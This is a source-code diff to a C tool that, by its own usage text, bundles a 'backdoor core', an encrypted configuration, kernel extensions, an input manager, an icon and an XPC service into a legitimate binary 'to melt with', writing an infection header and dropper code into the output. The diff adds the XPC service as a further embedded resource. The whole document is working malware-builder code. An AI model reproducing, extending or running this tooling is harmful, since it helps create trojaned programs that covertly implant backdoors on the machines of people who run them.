@@ -239,8 +239,6 @@ int appendData (char *inputFilePointer,
   stringTable     strings;
   resourceHeader  resource;
   
-  numberOfResources = 6;
-  
   //if (is64bitArch)
   //  originalEP = getBinaryEP_64 ((byte *)(inputFilePointer + inArchOffset));
   //else
@@ -255,6 +253,7 @@ int appendData (char *inputFilePointer,
   char *kext32FileName        = basename(kext32FilePath);
   char *kext64FileName        = basename(kext64FilePath);
   char *inputManagerFileName  = basename(inputManagerFilePath);
+  char *XPCFileName           = basename(XPCFilePath);
   char *iconFileName          = basename(iconFilePath);
   char *inputFileName         = basename(inputFilePath);
   char *outputFileName        = basename(outputFilePath);
@@ -263,7 +262,7 @@ int appendData (char *inputFilePointer,
   // Set the infection header
   //
   memset(&infection, 0, sizeof (infectionHeader));
-  infection.numberOfResources = numberOfResources;
+  infection.numberOfResources = gNumberOfResources;
   infection.numberOfStrings   = gNumStrings;
   infection.dropperSize       = (int)DROPPER_CODE_SIZE;
   infection.originalEP        = originalEP; //+ paddedPagezeroVASize - PAGE_ALIGNMENT;
@@ -587,6 +586,50 @@ int appendData (char *inputFilePointer,
   close (tempFD);
 #endif
   
+  //
+  // XPC service
+  //
+  resource.type = RESOURCE_IN_MANAGER;
+  memset (resource.name, 0, sizeof (resource.name));
+  memcpy (resource.name, XPCFileName, sizeof (resource.name));
+  resource.size = gXPCFileSize;
+  memset (resource.path, 0, sizeof (resource.path));
+  memcpy (resource.path, installPath, sizeof (resource.path));
+
+  memcpy (outputFilePointer + offset,
+          &resource,
+          sizeof (resourceHeader));
+
+  offset += sizeof (resourceHeader);
+#ifdef WIN32
+  if ((tempFilePointer = mapFile (XPCFilePath, &tempFileSize,
+                                  &tempFD, &tempFDMap, 0)) == NULL)
+#else 
+  if ((tempFilePointer = mapFile (XPCFilePath, &tempFileSize,
+                                  &tempFD, 0)) == NULL)
+#endif
+    {
+      printf("[ee] Error while mmapping the XPC service file\n");
+      exit (1);
+    }
+
+  memcpy (outputFilePointer + offset,
+          tempFilePointer,
+          gXPCFileSize);
+
+  offset += gXPCFileSize;
+  tempFileSize = 0;
+
+#ifdef WIN32
+  if(tempFilePointer != NULL)
+    UnmapViewOfFile(tempFilePointer);
+
+  CloseHandle(tempFDMap);
+  CloseHandle(tempFD);
+#else
+  close (tempFD);
+#endif
+
   //
   // ICON
   //
@@ -1338,15 +1381,16 @@ void
 usage(_mChar *aBinaryName)
 {
 #ifdef WIN32
-	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <icon> <dirname> <input> <output>\n\n", aBinaryName);
+	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <input> <output>\n\n", aBinaryName);
 #else
-  printf("\nUsage: %s <core> <conf> <kext32> <kext64> <dirname> <input> <output>\n\n", aBinaryName);
+  printf("\nUsage: %s <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <input> <output>\n\n", aBinaryName);
 #endif
   printf("\t<core>     : backdoor core\n");
   printf("\t<conf>     : backdoor encrypted configuration\n");
   printf("\t<kext32>   : kernel extension 32bit\n");
   printf("\t<kext64>   : kernel extension 64bit\n");
   printf("\t<imanager> : input manager\n");
+  printf("\t<xpc>      : xpc service\n");
   printf("\t<icon>     : icon\n");
   printf("\t<dirname>  : backdoor dir name\n");
   printf("\t<input>    : binary to melt with\n");
@@ -1356,7 +1400,7 @@ usage(_mChar *aBinaryName)
 int
 parseArguments(int argc, _mChar **argv)
 {
-	if(argc != 10)
+	if (argc != 11)
     {
       return kErrorGeneric;
     }
@@ -1382,10 +1426,11 @@ parseArguments(int argc, _mChar **argv)
   kext32FilePath        = argv[3];
   kext64FilePath        = argv[4];
   inputManagerFilePath  = argv[5];
-  iconFilePath          = argv[6];
-  installPath           = argv[7];
-  inputFilePath         = argv[8];
-  outputFilePath        = argv[9];
+  XPCFilePath           = argv[6];
+  iconFilePath          = argv[7];
+  installPath           = argv[8];
+  inputFilePath         = argv[9];
+  outputFilePath        = argv[10];
 
   return kSuccess;
 }
@@ -1401,6 +1446,12 @@ void freeArguments()
 		free(kext32FilePath);
   if (kext64FilePath != NULL)
 		free(kext64FilePath);
+  if (inputManagerFilePath != NULL)
+		free(inputManagerFilePath);
+  if (XPCFilePath != NULL)
+		free(XPCFilePath);
+  if (iconFilePath != NULL)
+		free(iconFilePath);
 	if (installPath != NULL)
 		free(installPath);
 	if (inputFilePath != NULL)
@@ -1422,7 +1473,8 @@ main(int argc, _mChar *argv[])
   int padding                 = 0;
   int i                       = 0;
   gNumStrings                 = 7;
- 
+  gNumberOfResources          = 7;
+
 #ifdef WIN32
   HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
 #else
@@ -1491,6 +1543,15 @@ main(int argc, _mChar *argv[])
       exit (1);
     }
 
+  if ((gXPCFileSize = getFileSize(XPCFilePath)) == kErrorGeneric)
+    {
+      printf ("[ee] XPC service file not found\n");
+#ifdef WIN32
+      //freeArguments();
+#endif
+      exit (1);
+    }
+
   if ((gIconFileSize = getFileSize(iconFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Icon file not found\n");
@@ -1529,10 +1590,11 @@ main(int argc, _mChar *argv[])
                     + gKext32FileSize
                     + gKext64FileSize
                     + gInputManagerFileSize
+                    + gXPCFileSize
                     + gIconFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
-                    + sizeof (resourceHeader) * 6;
+                    + sizeof (resourceHeader) * gNumberOfResources;
 
 #ifdef DEBUG_VERBOSE
   printf("unpadded outSize: %d\n", outputFileSize);
